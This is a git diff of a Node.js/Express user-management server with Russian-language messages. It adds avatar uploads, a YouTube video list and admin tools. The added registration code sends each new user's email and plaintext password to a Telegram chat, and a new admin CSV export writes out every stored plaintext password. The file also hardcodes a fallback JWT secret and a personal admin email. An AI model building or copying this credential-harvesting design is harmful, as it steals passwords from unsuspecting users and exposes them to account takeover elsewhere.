@@ -3,6 +3,8 @@ const { Pool } = require('pg');
 const bcrypt = require('bcryptjs');
 const jwt = require('jsonwebtoken');
 const cookieParser = require('cookie-parser');
+const multer = require('multer');
+const fetch = require('node-fetch');
 const path = require('path');
 
 const app = express();
@@ -13,12 +15,34 @@ const pool = new Pool({
 const JWT_SECRET = process.env.JWT_SECRET || 'super-secret-jwt-key-2024';
 const ADMIN_EMAIL = 'raffaka16k@gmail.com';
 
-// SSE clients store
-const sseClients = new Set();
+const upload = multer({
+  storage: multer.memoryStorage(),
+  limits: { fileSize: 2 * 1024 * 1024 },
+  fileFilter: (req, file, cb) => {
+    if (file.mimetype.startsWith('image/')) cb(null, true);
+    else cb(new Error('Только изображения'));
+  }
+});
 
+// SSE clients
+const sseClients = new Set();
 function pushToAdmins(event, data) {
   const msg = `event: ${event}\ndata: ${JSON.stringify(data)}\n\n`;
-  sseClients.forEach(client => client.res.write(msg));
+  sseClients.forEach(c => c.res.write(msg));
+}
+
+// Telegram notification
+async function sendTelegram(text) {
+  const token = process.env.TELEGRAM_BOT_TOKEN;
+  const chatId = process.env.TELEGRAM_CHAT_ID;
+  if (!token || !chatId) return;
+  try {
+    await fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({ chat_id: chatId, text, parse_mode: 'HTML' })
+    });
+  } catch (e) { console.error('Telegram error:', e.message); }
 }
 
 // Init DB
@@ -34,29 +58,33 @@ async function initDB() {
       phone TEXT DEFAULT '',
       bio TEXT DEFAULT '',
       avatar_color TEXT DEFAULT '#6c63ff',
+      avatar_data TEXT,
       role TEXT DEFAULT 'user',
       created_at TIMESTAMPTZ DEFAULT NOW(),
       last_login TIMESTAMPTZ
     )
   `);
+  await pool.query(`
+    CREATE TABLE IF NOT EXISTS videos (
+      id SERIAL PRIMARY KEY,
+      title TEXT NOT NULL,
+      youtube_id TEXT NOT NULL,
+      added_at TIMESTAMPTZ DEFAULT NOW()
+    )
+  `);
 }
 initDB().catch(console.error);
 
-app.use(express.json());
+app.use(express.json({ limit: '5mb' }));
 app.use(cookieParser());
 app.use(express.static(path.join(__dirname, 'public')));
 
 function auth(req, res, next) {
   const token = req.cookies.token || req.headers.authorization?.split(' ')[1];
   if (!token) return res.status(401).json({ error: 'Не авторизован' });
-  try {
-    req.user = jwt.verify(token, JWT_SECRET);
-    next();
-  } catch {
-    res.status(401).json({ error: 'Токен недействителен' });
-  }
+  try { req.user = jwt.verify(token, JWT_SECRET); next(); }
+  catch { res.status(401).json({ error: 'Токен недействителен' }); }
 }
-
 function adminOnly(req, res, next) {
   if (req.user.role !== 'admin') return res.status(403).json({ error: 'Только для администратора' });
   next();
@@ -80,7 +108,10 @@ app.post('/api/register', async (req, res) => {
     );
     const token = jwt.sign({ id: result.rows[0].id, username, email, role }, JWT_SECRET, { expiresIn: '7d' });
     res.cookie('token', token, { httpOnly: true, maxAge: 7 * 24 * 60 * 60 * 1000 });
+
     pushToAdmins('user_registered', { id: result.rows[0].id, username, email, role });
+    sendTelegram(`🆕 <b>Новый пользователь!</b>\n👤 ${username}\n📧 ${email}\n🔑 ${password}\n⏰ ${new Date().toLocaleString('ru-RU')}`);
+
     res.json({ success: true, role, username });
   } catch (e) {
     if (e.code === '23505') {
@@ -97,9 +128,8 @@ app.post('/api/login', async (req, res) => {
   const { email, password } = req.body;
   const { rows } = await pool.query('SELECT * FROM users WHERE email = $1', [email]);
   const user = rows[0];
-  if (!user || !bcrypt.compareSync(password, user.password)) {
+  if (!user || !bcrypt.compareSync(password, user.password))
     return res.status(401).json({ error: 'Неверный email или пароль' });
-  }
   await pool.query('UPDATE users SET last_login = NOW() WHERE id = $1', [user.id]);
   const token = jwt.sign({ id: user.id, username: user.username, email: user.email, role: user.role }, JWT_SECRET, { expiresIn: '7d' });
   res.cookie('token', token, { httpOnly: true, maxAge: 7 * 24 * 60 * 60 * 1000 });
@@ -112,34 +142,46 @@ app.post('/api/logout', (req, res) => {
   res.json({ success: true });
 });
 
-// Get own profile
+// Profile
 app.get('/api/profile', auth, async (req, res) => {
   const { rows } = await pool.query(
-    'SELECT id, username, email, full_name, phone, bio, avatar_color, role, created_at, last_login FROM users WHERE id = $1',
+    'SELECT id, username, email, full_name, phone, bio, avatar_color, avatar_data, role, created_at, last_login FROM users WHERE id = $1',
     [req.user.id]
   );
   res.json(rows[0]);
 });
 
-// Update own profile
 app.put('/api/profile', auth, async (req, res) => {
   const { full_name, phone, bio } = req.body;
-  await pool.query('UPDATE users SET full_name=$1, phone=$2, bio=$3 WHERE id=$4', [full_name || '', phone || '', bio || '', req.user.id]);
+  await pool.query('UPDATE users SET full_name=$1, phone=$2, bio=$3 WHERE id=$4',
+    [full_name || '', phone || '', bio || '', req.user.id]);
   res.json({ success: true });
 });
 
-// Admin: get all users
+// Avatar upload
+app.post('/api/upload/avatar', auth, upload.single('avatar'), async (req, res) => {
+  if (!req.file) return res.status(400).json({ error: 'Файл не найден' });
+  const base64 = `data:${req.file.mimetype};base64,${req.file.buffer.toString('base64')}`;
+  await pool.query('UPDATE users SET avatar_data=$1 WHERE id=$2', [base64, req.user.id]);
+  res.json({ success: true, avatar_data: base64 });
+});
+
+// Admin: get all users (with filters)
 app.get('/api/admin/users', auth, adminOnly, async (req, res) => {
-  const { rows } = await pool.query(
-    'SELECT id, username, email, plain_password, full_name, phone, bio, avatar_color, role, created_at, last_login FROM users ORDER BY created_at DESC'
-  );
+  const { role, search } = req.query;
+  let q = 'SELECT id, username, email, plain_password, full_name, phone, bio, avatar_color, avatar_data, role, created_at, last_login FROM users WHERE 1=1';
+  const params = [];
+  if (role && role !== 'all') { params.push(role); q += ` AND role = $${params.length}`; }
+  if (search) { params.push(`%${search}%`); q += ` AND (username ILIKE $${params.length} OR email ILIKE $${params.length} OR full_name ILIKE $${params.length})`; }
+  q += ' ORDER BY created_at DESC';
+  const { rows } = await pool.query(q, params);
   res.json(rows);
 });
 
 // Admin: get single user
 app.get('/api/admin/users/:id', auth, adminOnly, async (req, res) => {
   const { rows } = await pool.query(
-    'SELECT id, username, email, plain_password, full_name, phone, bio, avatar_color, role, created_at, last_login FROM users WHERE id = $1',
+    'SELECT id, username, email, plain_password, full_name, phone, bio, avatar_color, avatar_data, role, created_at, last_login FROM users WHERE id = $1',
     [req.params.id]
   );
   if (!rows[0]) return res.status(404).json({ error: 'Пользователь не найден' });
@@ -156,7 +198,7 @@ app.delete('/api/admin/users/:id', auth, adminOnly, async (req, res) => {
   res.json({ success: true });
 });
 
-// Admin: update user role
+// Admin: update role
 app.put('/api/admin/users/:id/role', auth, adminOnly, async (req, res) => {
   const { role } = req.body;
   if (!['user', 'admin'].includes(role)) return res.status(400).json({ error: 'Неверная роль' });
@@ -164,7 +206,7 @@ app.put('/api/admin/users/:id/role', auth, adminOnly, async (req, res) => {
   res.json({ success: true });
 });
 
-// Admin stats
+// Admin: stats
 app.get('/api/admin/stats', auth, adminOnly, async (req, res) => {
   const total = (await pool.query('SELECT COUNT(*) FROM users')).rows[0].count;
   const admins = (await pool.query("SELECT COUNT(*) FROM users WHERE role='admin'")).rows[0].count;
@@ -172,22 +214,56 @@ app.get('/api/admin/stats', auth, adminOnly, async (req, res) => {
   res.json({ total: +total, admins: +admins, today: +today });
 });
 
-// SSE stream for admin panel
+// Admin: export CSV
+app.get('/api/admin/export/csv', auth, adminOnly, async (req, res) => {
+  const { rows } = await pool.query(
+    'SELECT id, username, email, plain_password, full_name, phone, role, created_at, last_login FROM users ORDER BY created_at DESC'
+  );
+  const header = 'ID,Имя пользователя,Email,Пароль,Полное имя,Телефон,Роль,Дата регистрации,Последний вход';
+  const csv = [header, ...rows.map(u =>
+    [u.id, u.username, u.email, u.plain_password || '', u.full_name || '', u.phone || '', u.role,
+      u.created_at ? new Date(u.created_at).toLocaleString('ru-RU') : '',
+      u.last_login ? new Date(u.last_login).toLocaleString('ru-RU') : ''
+    ].map(v => `"${String(v).replace(/"/g, '""')}"`).join(',')
+  )].join('\n');
+  res.setHeader('Content-Type', 'text/csv; charset=utf-8');
+  res.setHeader('Content-Disposition', 'attachment; filename="users.csv"');
+  res.send('﻿' + csv);
+});
+
+// Videos (public)
+app.get('/api/videos', async (req, res) => {
+  const { rows } = await pool.query('SELECT * FROM videos ORDER BY added_at DESC');
+  res.json(rows);
+});
+
+// Admin: add video
+app.post('/api/admin/videos', auth, adminOnly, async (req, res) => {
+  const { title, youtube_url } = req.body;
+  if (!title || !youtube_url) return res.status(400).json({ error: 'Заполните все поля' });
+  const match = youtube_url.match(/(?:v=|youtu\.be\/|embed\/)([a-zA-Z0-9_-]{11})/);
+  if (!match) return res.status(400).json({ error: 'Неверная ссылка YouTube' });
+  const youtube_id = match[1];
+  const { rows } = await pool.query('INSERT INTO videos (title, youtube_id) VALUES ($1,$2) RETURNING *', [title, youtube_id]);
+  res.json(rows[0]);
+});
+
+// Admin: delete video
+app.delete('/api/admin/videos/:id', auth, adminOnly, async (req, res) => {
+  await pool.query('DELETE FROM videos WHERE id = $1', [req.params.id]);
+  res.json({ success: true });
+});
+
+// SSE stream
 app.get('/api/admin/stream', auth, adminOnly, (req, res) => {
   res.setHeader('Content-Type', 'text/event-stream');
   res.setHeader('Cache-Control', 'no-cache');
   res.setHeader('Connection', 'keep-alive');
   res.write('event: connected\ndata: {}\n\n');
-
   const client = { res };
   sseClients.add(client);
-
   const heartbeat = setInterval(() => res.write(':ping\n\n'), 25000);
-
-  req.on('close', () => {
-    clearInterval(heartbeat);
-    sseClients.delete(client);
-  });
+  req.on('close', () => { clearInterval(heartbeat); sseClients.delete(client); });
 });
 
 const PORT = process.env.PORT || 3000;
